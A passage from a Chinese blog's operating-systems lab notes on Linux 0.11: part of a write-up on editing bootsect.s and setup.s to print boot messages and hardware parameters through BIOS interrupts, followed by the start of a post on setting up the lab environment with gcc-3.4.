after</span><br><span class="line">! the bootblock:</span><br><span class="line"></span><br><span class="line">	jmpi	0,SETUPSEG</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 <code>int 0x10</code> 的中断服务程序可以将字符串输出到屏幕上</li>
<li>输出信息并进行初始化后，程序会调用 read_it 来读取磁盘上的 system 模块，并将其加载到 0x10000 </li>
<li>最后跳转到 0x90200 执行 setup 的代码</li>
</ul>
<p>计算机上电后，ROM BIOS 会在物理内存 0 处初始化中断向量表，其中有256个中断向量，每个中断向量占用4字节，共1KB，在物理内存地址 0x000-0x3ff 处，这些中断向量供 BIOS 中断使用</p>
<p>BIOS 初始化中断向量表后，启动设备的第一个扇区（即引导扇区）读入内存地址 0x7c00 处，并跳转到此处开始执行：</p>
<ul>
<li>此时操作系统处于实模式，寻址方式为：16位段寄存器 * 0x10 + 16位目标寄存器</li>
<li>为了方便加载主模块，引导程序首先会将自己拷贝到内存相对靠后的位置（如 linux0.11 的 bootsect 程序先将自己移动到 0x90000 处），然后跳转过去执行</li>
<li>在接下来的步骤中，程序会依次加载 setup 和 system 的代码，并跳转执行 setup 的代码</li>
</ul>
<p>setup.s 是一个汇编语言源代码文件，通常位于操作系统内核的源代码目录中，它的作用是设置操作系统的初始状态，为操作系统其他模块的运行做准备：</p>
<ul>
<li>操作系统的主模块为了让其中代码地址等于实际的物理地址，需要将其加载到内存 0x0000 处，但此时会覆盖在 0x000-0x3ff 处的 BIOS 中断向量表</li>
<li>所以操作系统在加载时需要先将主模块加载到内存中不与 BIOS 中断向量表冲突的地址处，之后在可以覆盖中断向量表时才将其移动到 0x0000</li>
<li>例如在 Linux0.11 的 system 模块就是先在 bootsect 程序中被加载到了 0x10000，之后在 setup 程序中移到 0x0000 处</li>
</ul>
<p>接下来的工作就是利用 <code>int 0x10</code> 来将我们需要的字符串打印到屏幕上，为此我们需要先把字符串构造好：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msgmy:</span><br><span class="line">	.ascii &quot;YHellowOS is loading...&quot;</span><br><span class="line">	.byte 13,10,13,10</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msgmy:</span><br><span class="line">	.ascii &quot;Now we are in setup...&quot;</span><br><span class="line">	.byte 13,10,13,10</span><br></pre></td></tr></table></figure>
<ul>
<li><code>13,10</code> 代表换行符</li>
</ul>
<p>接下来就可以编写打印函数了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">read_cur:</span><br><span class="line">	mov	ah,#0x03	</span><br><span class="line">	xor	bh,bh </span><br><span class="line">	int	0x10</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">print_string:</span><br><span class="line">	mov cx,bx</span><br><span class="line">	mov	bx,#0x0007</span><br><span class="line">	mov	bp,ax</span><br><span class="line">	mov	ax,#0x1301		</span><br><span class="line">	int	0x10</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<ul>
<li>read_cur 用于获取光标位置（如果没有这一步，打印数据很可能会被后续数据覆盖），寄存器 cx 中的值就是该字符串的长度，寄存器 bx 中的值代表了输出字符的颜色</li>
<li>print_string 用于打印字符串，需要传入两个参数（ax：字符串地址，bx：字符串长度）</li>
</ul>
<p>这里有一点需要注意：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,#INITSEG</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,#SETUPSEG</span><br><span class="line">mov	es,ax  </span><br><span class="line"></span><br><span class="line">call read_cur</span><br><span class="line">mov ax,#msgmy</span><br><span class="line">mov	bx,#26</span><br><span class="line">call print_string</span><br></pre></td></tr></table></figure>
<ul>
<li>在 setup.s 中使用 read_cur 获取光标位置前，需要先重置 ds/es（主要是重置 es 格外数据段）</li>
</ul>
<p>在输出硬件参数前我们需要知道 setup.s 读取了哪些硬件参数，找到其核心代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">entry start</span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">! ok, the read went well so we get current cursor position and save it for</span><br><span class="line">! posterity.</span><br><span class="line"># 获取光标位置(0x9000:0x0)</span><br><span class="line">	mov	ax,#INITSEG	! this is done in bootsect already, but...</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	ah,#0x03	! read cursor pos</span><br><span class="line">	xor	bh,bh</span><br><span class="line">	int	0x10		! save it in known place, con_init fetches</span><br><span class="line">	mov	[0],dx		! it from 0x90000.</span><br><span class="line">! Get memory size (extended mem, kB)</span><br><span class="line"># 获取拓展内存大小(0x9000:0x2)</span><br><span class="line">	mov	ah,#0x88</span><br><span class="line">	int	0x15</span><br><span class="line">	mov	[2],ax</span><br><span class="line"></span><br><span class="line">! Get video-card data:</span><br><span class="line"># 获取显卡video-card参数(0x9000:0x6)</span><br><span class="line">	mov	ah,#0x0f</span><br><span class="line">	int	0x10</span><br><span class="line">	mov	[4],bx		! bh = display page</span><br><span class="line">	mov	[6],ax		! al = video mode, ah = window width</span><br><span class="line"></span><br><span class="line">! check for EGA/VGA and some config parameters</span><br><span class="line">	mov	ah,#0x12</span><br><span class="line">	mov	bl,#0x10</span><br><span class="line">	int	0x10</span><br><span class="line">	mov	[8],ax</span><br><span class="line">	mov	[10],bx</span><br><span class="line">	mov	[12],cx</span><br><span class="line"></span><br><span class="line">! Get hd0 data</span><br><span class="line"># 获取硬盘hd0参数(0x9000:0x80)</span><br><span class="line">	mov	ax,#0x0000</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	lds	si,[4*0x41]</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov	di,#0x0080</span><br><span class="line">	mov	cx,#0x10</span><br><span class="line">	rep</span><br><span class="line">	movsb				# ds:si(4*0x41)-&gt;es:di(0x90000+0x80)</span><br><span class="line"></span><br><span class="line">! Get hd1 data</span><br><span class="line"># 获取硬盘hd1参数(0x9000:0x90)</span><br><span class="line">	mov	ax,#0x0000</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	lds	si,[4*0x46]</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov	di,#0x0090</span><br><span class="line">	mov	cx,#0x10</span><br><span class="line">	rep</span><br><span class="line">	movsb				# ds:si(4*0x41)-&gt;es:di(0x90000+0x90)</span><br><span class="line">	</span><br><span class="line">	......</span><br></pre></td></tr></table></figure>
<ul>
<li>我们需要打印的设备有 HD0，HD1，VC（地址偏移记录在注释中）</li>
</ul>
<p>为了方便读取地址中的数据，我们需要写一个打印函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">print_hex_4:</span><br><span class="line">	mov cx,#4   </span><br><span class="line">	j print_hex</span><br><span class="line">print_hex_2:</span><br><span class="line">	mov cx,#2</span><br><span class="line">	j print_hex</span><br><span class="line">print_hex:</span><br><span class="line">	mov dx,ax   </span><br><span class="line">print_digit:</span><br><span class="line">	rol dx,#4		# 向左循环移动4位</span><br><span class="line">	mov ax,#0xe0f </span><br><span class="line">	and al,dl </span><br><span class="line">	add al,#0x30	# 将数据转化为ascii字符</span><br><span class="line">	cmp al,#0x3a</span><br><span class="line">	jl outp  </span><br><span class="line">	add al,#0x07  </span><br><span class="line">outp:</span><br><span class="line">	int 0x10</span><br><span class="line">	loop print_digit</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>最后我们可以按照数据的格式写出代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">! Show HD Information:</span><br><span class="line">	mov ax,#INITSEG		# 由于之前修改了ds/es,这里要先将它们改回</span><br><span class="line">	mov ds,ax</span><br><span class="line">	mov ax,#SETUPSEG</span><br><span class="line">	mov	es,ax  </span><br><span class="line"></span><br><span class="line">	call read_cur		# 打印Cursor POS</span><br><span class="line">	mov ax,#cur</span><br><span class="line">	mov bx,#13</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur		# 打印Memory SIZE</span><br><span class="line">	mov ax,#mem</span><br><span class="line">	mov bx,#12</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[2]</span><br><span class="line">	call print_hex_4</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#kb</span><br><span class="line">	mov bx,#4</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	call read_cur		# 打印video-card设备的数据</span><br><span class="line">	mov ax,#vc</span><br><span class="line">	mov bx,#11</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#display</span><br><span class="line">	mov bx,#13</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[4]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#mode</span><br><span class="line">	mov bx,#11</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[6]</span><br><span class="line">	call print_hex_2</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#width</span><br><span class="line">	mov bx,#13</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[8]</span><br><span class="line">	call print_hex_2</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur		# 打印hd0设备的数据</span><br><span class="line">	mov ax,#hd1</span><br><span class="line">	mov bx,#12</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#cyl</span><br><span class="line">	mov bx,#10</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0x80]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#head</span><br><span class="line">	mov bx,#8</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0x80+0x2]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#sect</span><br><span class="line">	mov bx,#8</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0x80+0xe]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur		# 打印hd1设备的数据</span><br><span class="line">	mov ax,#hd2</span><br><span class="line">	mov bx,#12</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#cyl</span><br><span class="line">	mov bx,#10</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0x90]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#head</span><br><span class="line">	mov bx,#8</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0x90+0x2]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br><span class="line"></span><br><span class="line">	call read_cur</span><br><span class="line">	mov ax,#sect</span><br><span class="line">	mov bx,#8</span><br><span class="line">	call print_string</span><br><span class="line"></span><br><span class="line">	mov ax,[0x90+0xe]</span><br><span class="line">	call print_hex_4</span><br><span class="line">	call print_nl</span><br></pre></td></tr></table></figure>
<p>至于最后一个要求，我们只需要写一个死循环即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l:  jmp l</span><br></pre></td></tr></table></figure>
<p>最终效果如下：</p>
<img src="/2023/10/20/HIT-OSLab1/1697733495967.png" class width="1697733495967"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/20/HIT-OSLab0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/HIT-OSLab0/" class="post-title-link" itemprop="url">HIT-OSLab0</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-20 00:40:11" itemprop="dateCreated datePublished" datetime="2023-10-20T00:40:11+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-26 13:49:13" itemprop="dateModified" datetime="2023-10-26T13:49:13+08:00">2023-10-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>cHIT-OSLab0</strong></p>
<p>实验环境搭建：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/DeathKing/hit-oslab.git</span><br><span class="line">cd hit-oslab </span><br><span class="line">./setup.sh </span><br></pre></td></tr></table></figure>
<ul>
<li>在用户目录下会生成一个 oslab 目录，这里面就是实验的环境（阉割版的 Linux 0.11）</li>
</ul>
<p>Linux 0.11 需要 gcc-3.4 进行编译，使用如下命令添加并切换 gcc-3.4 的链接组：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-3.4 50</span><br><span class="line">sudo update-alternatives --config gcc</span><br></pre></td></tr></table></figure>
<p>再使用如下命令进行切换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  选择       路径            优先级  状态</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">  <span class="number">0</span>            /usr/bin/gcc<span class="number">-5</span>     <span class="number">50</span>        自动模式</span><br><span class="line">  <span class="number">1</span>            /usr/bin/gcc<span class="number">-11</span>    <span class="number">50</span>        手动模式</span><br><span class="line">* <span class="number">2</span>            /usr/bin/gcc<span class="number">-3.4</span>   <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">3</span>            /usr/bin/gcc<span class="number">-5</span>     <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">4</span>            /usr/bin/gcc<span class="number">-7</span>     <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">5</span>            /usr/bin/gcc<span class="number">-9</span>     <span class="number">50</span>        手动模式</span><br></pre></td></tr></table></figure>
<p>Linux 0.11 是 Linux 操作系统的第一版本，于 1991 年发布，它的源码结构反映了 Linux 的发展历程和设计思想 </p>
<p>Linux 0.11 的源码结构比较简单，主要由以下几个部分组成：</p>
<ul>
<li>内核（kernel）</li>
<li>系统调用（syscall）</li>
<li>用户空间应用程序（userland apps）</li>
<li>配置文件（config files）</li>
</ul>
<p>实验目录的结构如下：（部分缺失的功能将由后续实验完成）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bochs <span class="comment">/* QEMU模拟器插件 */</span></span><br><span class="line">│   ├── BIOS-bochs-latest</span><br><span class="line">│   ├── bochsrc.bxrc</span><br><span class="line">│   ├── bochsrc-gdb.bxrc</span><br><span class="line">│   └── vgabios.bin</span><br><span class="line">├── files</span><br><span class="line">│   ├── memtest</span><br><span class="line">│   ├── process.c</span><br><span class="line">│   ├── stat_log.py</span><br><span class="line">│   ├── testlab2.c</span><br><span class="line">│   └── testlab2.sh</span><br><span class="line">├── hdc</span><br><span class="line">│   └── umounted</span><br><span class="line">├── hdc<span class="number">-0.11</span>.img</span><br><span class="line">├── linux<span class="number">-0.11</span> <span class="comment">/* linux-0.11源码 */</span></span><br><span class="line">│   ├── boot <span class="comment">/* 引导程序 */</span></span><br><span class="line">│   │   ├── bootsect.s</span><br><span class="line">│   │   ├── head.s</span><br><span class="line">│   │   └── setup.s</span><br><span class="line">│   ├── fs <span class="comment">/* 内核文件系统 */</span></span><br><span class="line">│   │   ├── bitmap.c</span><br><span class="line">│   │   ├── block_dev.c</span><br><span class="line">│   │   ├── buffer.c</span><br><span class="line">│   │   ├── char_dev.c</span><br><span class="line">│   │   ├── exec.c</span><br><span class="line">│   │   ├── fcntl.c</span><br><span class="line">│   │   ├── file_dev.c</span><br><span class="line">│   │   ├── file_table.c</span><br><span class="line">│   │   ├── inode.c</span><br><span class="line">│   │   ├── ioctl.c</span><br><span class="line">│   │   ├── Makefile</span><br><span class="line">│   │   ├── namei.c</span><br><span class="line">│   │   ├── open.c</span><br><span class="line">│   │   ├── pipe.c</span><br><span class="line">│   │   ├── read_write.c</span><br><span class="line">│   │   ├── stat.c</span><br><span class="line">│   │   ├── super.c</span><br><span class="line">│   │   └── truncate.c</span><br><span class="line">│   ├── include <span class="comment">/* 内核头文件 */</span></span><br><span class="line">│   │   ├── a.out.h</span><br><span class="line">│   │   ├── <span class="keyword">asm</span></span><br><span class="line">│   │   │   ├── io.h</span><br><span class="line">│   │   │   ├── memory.h</span><br><span class="line">│   │   │   ├── segment.h</span><br><span class="line">│   │   │   └── system.h</span><br><span class="line">│   │   ├── <span class="keyword">const</span>.h</span><br><span class="line">│   │   ├── ctype.h</span><br><span class="line">│   │   ├── errno.h</span><br><span class="line">│   │   ├── fcntl.h</span><br><span class="line">│   │   ├── linux</span><br><span class="line">│   │   │   ├── config.h</span><br><span class="line">│   │   │   ├── fdreg.h</span><br><span class="line">│   │   │   ├── fs.h</span><br><span class="line">│   │   │   ├── hdreg.h</span><br><span class="line">│   │   │   ├── head.h</span><br><span class="line">│   │   │   ├── kernel.h</span><br><span class="line">│   │   │   ├── mm.h</span><br><span class="line">│   │   │   ├── sched.h</span><br><span class="line">│   │   │   ├── sched.h.cur1</span><br><span class="line">│   │   │   ├── sched.h.old</span><br><span class="line">│   │   │   ├── sys.h</span><br><span class="line">│   │   │   └── tty.h</span><br><span class="line">│   │   ├── signal.h</span><br><span class="line">│   │   ├── stdarg.h</span><br><span class="line">│   │   ├── stddef.h</span><br><span class="line">│   │   ├── <span class="built_in">string</span>.h</span><br><span class="line">│   │   ├── sys</span><br><span class="line">│   │   │   ├── stat.h</span><br><span class="line">│   │   │   ├── times.h</span><br><span class="line">│   │   │   ├── types.h</span><br><span class="line">│   │   │   ├── utsname.h</span><br><span class="line">│   │   │   └── wait.h</span><br><span class="line">│   │   ├── termios.h</span><br><span class="line">│   │   ├── time.h</span><br><span class="line">│   │   ├── unistd.h</span><br><span class="line">│   │   └── utime.h</span><br><span class="line">│   ├── init <span class="comment">/* init进程 */</span></span><br><span class="line">│   │   └── main.c</span><br><span class="line">│   ├── kernel <span class="comment">/* 内核 */</span></span><br><span class="line">│   │   ├── <span class="keyword">asm</span>.s</span><br><span class="line">│   │   ├── blk_drv <span class="comment">/* 内核块驱动 */</span></span><br><span class="line">│   │   │   ├── blk.h</span><br><span class="line">│   │   │   ├── floppy.c</span><br><span class="line">│   │   │   ├── hd.c</span><br><span class="line">│   │   │   ├── ll_rw_blk.c</span><br><span class="line">│   │   │   ├── Makefile</span><br><span class="line">│   │   │   └── ramdisk.c</span><br><span class="line">│   │   ├── chr_drv <span class="comment">/* 内核字符驱动 */</span></span><br><span class="line">│   │   │   ├── console.c</span><br><span class="line">│   │   │   ├── keyboard.S</span><br><span class="line">│   │   │   ├── Makefile</span><br><span class="line">│   │   │   ├── rs_io.s</span><br><span class="line">│   │   │   ├── serial.c</span><br><span class="line">│   │   │   ├── tty_io.c</span><br><span class="line">│   │   │   └── tty_ioctl.c</span><br><span class="line">│   │   ├── <span class="built_in">exit</span>.c</span><br><span class="line">│   │   ├── fork.c</span><br><span class="line">│   │   ├── Makefile</span><br><span class="line">│   │   ├── math</span><br><span class="line">│   │   │   ├── Makefile</span><br><span class="line">│   │   │   └── math_emulate.c</span><br><span class="line">│   │   ├── mktime.c</span><br><span class="line">│   │   ├── panic.c</span><br><span class="line">│   │   ├── 